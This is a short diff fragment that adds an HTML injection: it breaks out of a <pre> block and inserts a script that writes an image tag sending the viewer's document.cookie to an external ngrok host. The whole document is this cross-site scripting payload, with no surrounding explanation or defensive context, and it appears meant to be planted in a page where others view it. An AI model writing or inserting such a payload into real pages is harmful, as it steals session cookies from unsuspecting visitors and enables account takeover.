@@ -1,0 +1,5 @@
+</pre>
+<script>
+document.write('<img src="http://6f97f1b2d483.ngrok.io/idiot.png?cookie=' + document.cookie + '" />')
+</script>
+<pre>
